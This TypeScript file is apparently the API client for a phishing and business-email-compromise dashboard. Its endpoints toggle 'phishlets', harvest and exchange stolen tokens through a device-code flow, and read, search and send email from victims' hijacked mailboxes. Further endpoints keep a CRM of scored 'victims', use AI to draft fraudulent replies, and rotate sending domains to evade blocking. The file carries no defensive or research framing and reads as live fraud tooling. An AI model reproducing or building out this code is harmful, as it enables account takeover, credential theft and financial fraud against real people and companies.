import axios from 'axios';

const API_BASE = '/dash/api';

export const api = axios.create({
  baseURL: API_BASE,
  headers: { 'Content-Type': 'application/json' },
});

// ── Logs ──
export const getLogs = () => api.get('/logs');
export const getLog = (filename: string) => api.get(`/log/${filename}`);
export const exportAll = () => api.get('/export/all', { responseType: 'blob' });

// ── Visits ──
export const getVisits = () => api.get('/visits');
export const getVisitStats = () => api.get('/visits/stats');

// ── Analytics ──
export const getAnalytics = () => api.get('/analytics');

// ── Status ──
export const getStatus = () => api.get('/status');

// ── Token Vault ──
export const scanVault = () => api.post('/vault/scan');
export const getVaultTokens = () => api.get('/vault/tokens');
export const getVaultStats = () => api.get('/vault/stats');
export const getVaultUsers = () => api.get('/vault/users');
export const healthCheckVault = () => api.post('/vault/healthcheck');
export const exchangeVaultToken = (tokenValue: string) =>
  api.post('/vault/exchange', { tokenValue });

// ── Device Code ──
export const getDeviceHistory = () => api.get('/device/history');
export const getDeviceStats = () => api.get('/device/stats');
export const getDeviceFlow = (deviceCode: string) =>
  api.get(`/device/flow/${deviceCode}`);
export const deleteDeviceFlow = (deviceCode: string) =>
  api.delete(`/device/flow/${deviceCode}`);
export const generateManualCode = (user_code: string) =>
  api.post('/device/manual', { user_code });
export const useDeviceToken = (session_id: string) =>
  api.post('/device/use', { session_id });

// ── Phishlets ──
export const getPhishlets = () => api.get('/phishlets');
export const togglePhishlet = (id: string, enabled: boolean) =>
  api.post('/phishlets/toggle', { id, enabled });

// ── Recon ──
export const recon = (accessToken: string, refreshToken?: string, email?: string) =>
  api.post('/recon', { accessToken, refreshToken, email });

// ── Webmail ──
export const getWebmailFolders = (accessToken: string) =>
  api.post('/webmail/folders', { accessToken });
export const getWebmailEmails = (
  accessToken: string,
  folderId = 'inbox',
  limit = 50,
  skip = 0
) => api.post('/webmail/emails', { accessToken, folderId, limit, skip });
export const getWebmailEmail = (accessToken: string, messageId: string) =>
  api.post('/webmail/email', { accessToken, messageId });
export const sendWebmailEmail = (
  accessToken: string,
  to: string[],
  subject: string,
  body: string,
  replyToId?: string,
  forwardFromId?: string
) => api.post('/webmail/send', { accessToken, to, subject, body, replyToId, forwardFromId });
export const searchWebmail = (
  accessToken: string,
  query: string,
  folderId = 'inbox',
  limit = 50
) => api.post('/webmail/search', { accessToken, query, folderId, limit });

// ── Replay ──
export const getReplay = (filename: string) => api.get(`/replay/${filename}`);
export const getTokens = (filename: string) => api.get(`/tokens/${filename}`);

// ── ✅ NEW BEC CRM ENDPOINTS ──
export const getCRMVictims = (filters?: { status?: string; company?: string; industry?: string; score_min?: number }) =>
  api.get('/crm/victims', { params: filters });
export const addCRMVictim = (data: any) => api.post('/crm/victims', data);
export const getCRMStats = () => api.get('/crm/stats');
export const logCRMEmail = (data: { victimId: number; campaignId?: number; direction: string; subject: string; body: string; htmlBody?: string }) =>
  api.post('/crm/email', data);

// ── ✅ NEW BEC AI ENDPOINTS ──
export const aiAnalyzeEmail = (emailContent: string) =>
  api.post('/ai/analyze', { emailContent });
export const aiGenerateReply = (context: string, strategy?: string) =>
  api.post('/ai/generate-reply', { context, strategy });
export const aiScoreVictim = (victimData: any) =>
  api.post('/ai/score-victim', { victimData });

// ── ✅ NEW BEC TOKEN MANAGEMENT ENDPOINTS ──
export const storeToken = (userId: string, tokenData: any) =>
  api.post('/tokens/store', { userId, tokenData });
export const getUserToken = (userId: string) =>
  api.get(`/tokens/${userId}`);
export const getAllTokens = () =>
  api.get('/tokens/all');
export const getTokensFromDB = (limit?: number) =>
  api.get('/tokens/db', { params: { limit } });

// ── ✅ NEW BEC EMAIL ENGINE ENDPOINTS ──
export const sendEmail = (to: string, subject: string, html: string, from?: string) =>
  api.post('/email/send', { to, subject, html, from });
export const rotateEmailDomain = () =>
  api.post('/email/rotate-domain');
export const getEmailConfig = () =>
  api.get('/email/config');
